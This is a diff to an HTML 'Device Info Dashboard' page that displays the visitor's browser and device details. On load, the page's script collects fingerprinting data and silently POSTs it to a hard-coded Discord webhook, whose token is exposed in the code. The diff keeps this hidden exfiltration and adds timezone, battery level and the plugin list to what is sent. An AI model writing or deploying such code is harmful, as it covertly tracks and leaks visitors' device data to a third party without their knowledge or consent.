@@ -3,14 +3,14 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Full Device Info Dashboard</title>
+  <title>Device Info Dashboard</title>
   <style>
     body {
       margin: 0;
       padding: 0;
       background: black;
       color: white;
-      font-family: 'Arial', sans-serif;
+      font-family: Arial, sans-serif;
       display: flex;
       justify-content: center;
       align-items: center;
@@ -91,6 +91,12 @@
       <p id="cookiesEnabled"></p>
       <p id="connectionType"></p>
     </div>
+    <div class="information-box">
+      <h2>Additional Info</h2>
+      <p id="timezone"></p>
+      <p id="battery"></p>
+      <p id="plugins"></p>
+    </div>
   </div>
 
   <script>
@@ -163,38 +169,57 @@
       initParticles();
     });
 
-    const deviceInfo = {
-      browserName: navigator.appName,
-      userAgent: navigator.userAgent,
-      platform: navigator.platform,
-      vendor: navigator.vendor,
-      appVersion: navigator.appVersion,
-      deviceType: navigator.platform,
-      cpuCores: navigator.hardwareConcurrency || "N/A",
-      memory: navigator.deviceMemory || "N/A",
-      javaEnabled: navigator.javaEnabled() ? "Yes" : "No",
-      touchSupport: ('ontouchstart' in window) ? "Yes" : "No",
-      screenResolution: `${window.screen.width} x ${window.screen.height}`,
-      colorDepth: window.screen.colorDepth,
-      pixelRatio: window.devicePixelRatio,
-      screenOrientation: screen.orientation ? screen.orientation.type : "N/A",
-      onlineStatus: navigator.onLine ? "Yes" : "No",
-      language: navigator.language,
-      cookiesEnabled: navigator.cookieEnabled ? "Yes" : "No",
-      connectionType: navigator.connection ? navigator.connection.effectiveType : "N/A"
-    };
+    async function getBatteryInfo() {
+      if (navigator.getBattery) {
+        const battery = await navigator.getBattery();
+        return `${(battery.level*100).toFixed(0)}%`;
+      }
+      return "N/A";
+    }
 
-    Object.keys(deviceInfo).forEach(id=>{
-      const el = document.getElementById(id);
-      if(el) el.textContent = `${id.replace(/([A-Z])/g, ' $1')}: ${deviceInfo[id]}`;
-    });
+    function getPlugins(){
+      return navigator.plugins.length > 0 ? Array.from(navigator.plugins).map(p => p.name).join(", ") : "None";
+    }
 
-    fetch('https://discord.com/api/webhooks/1406693004105748640/wJddHnKs8_eSvVohH8Sl3Ti2qJsDnFs7vr3RWElFwwvUDjX1JRY72OMJ8d81d-x-MZVC', {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ content: JSON.stringify(deviceInfo, null, 2) })
-    }).then(()=>console.log("Device info sent safely"))
-      .catch(err=>console.error(err));
+    async function collectDeviceInfo() {
+      const deviceInfo = {
+        browserName: navigator.appName,
+        userAgent: navigator.userAgent,
+        platform: navigator.platform,
+        vendor: navigator.vendor,
+        appVersion: navigator.appVersion,
+        deviceType: navigator.platform,
+        cpuCores: navigator.hardwareConcurrency || "N/A",
+        memory: navigator.deviceMemory || "N/A",
+        javaEnabled: navigator.javaEnabled() ? "Yes" : "No",
+        touchSupport: ('ontouchstart' in window) ? "Yes" : "No",
+        screenResolution: `${window.screen.width} x ${window.screen.height}`,
+        colorDepth: window.screen.colorDepth,
+        pixelRatio: window.devicePixelRatio,
+        screenOrientation: screen.orientation ? screen.orientation.type : "N/A",
+        onlineStatus: navigator.onLine ? "Yes" : "No",
+        language: navigator.language,
+        cookiesEnabled: navigator.cookieEnabled ? "Yes" : "No",
+        connectionType: navigator.connection ? navigator.connection.effectiveType : "N/A",
+        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+        battery: await getBatteryInfo(),
+        plugins: getPlugins()
+      };
+
+      Object.keys(deviceInfo).forEach(id=>{
+        const el = document.getElementById(id);
+        if(el) el.textContent = `${id.replace(/([A-Z])/g, ' $1')}: ${deviceInfo[id]}`;
+      });
+
+      fetch('https://discord.com/api/webhooks/1406693004105748640/wJddHnKs8_eSvVohH8Sl3Ti2qJsDnFs7vr3RWElFwwvUDjX1JRY72OMJ8d81d-x-MZVC', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ content: JSON.stringify(deviceInfo, null, 2) })
+      }).then(()=>console.log("Device info sent"))
+        .catch(err=>console.error(err));
+    }
+
+    collectDeviceInfo();
   </script>
 </body>
 </html>
